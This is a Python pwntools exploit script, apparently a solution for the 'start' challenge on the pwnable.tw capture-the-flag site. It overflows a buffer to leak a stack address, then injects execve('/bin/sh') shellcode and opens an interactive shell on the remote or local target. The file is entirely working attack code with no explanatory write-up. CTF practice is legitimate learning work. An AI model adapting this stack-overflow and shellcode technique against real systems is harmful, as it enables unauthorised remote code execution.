#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
import sys
context.log_level = "debug"
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

if sys.argv[1] == 'r':
    io = remote("chall.pwnable.tw", 10000)
else:
    io = process("./start")

shellcode = asm("xor ecx, ecx")
shellcode += asm("mul ecx")
shellcode += asm("push ecx")
shellcode += asm("push 0x68732f2f")
shellcode += asm("push 0x6e69622f")
shellcode += asm("mov ebx, esp")
shellcode += asm("mov al, 0xb")
shellcode += asm("int 0x80")

payload = fit({0x14: p32(0x8048087)})
#  io.sendlineafter("CTF:", payload)
io.sendafter("CTF:", payload)
leaked_stack = u32(io.recv(4))
info("leaked_stack -> 0x%x" % leaked_stack)

payload = flat([cyclic(0x14), leaked_stack + 0x14, shellcode])
#  io.sendlineafter("CTF:", payload)
io.sendline(payload)

io.interactive()
io.close()
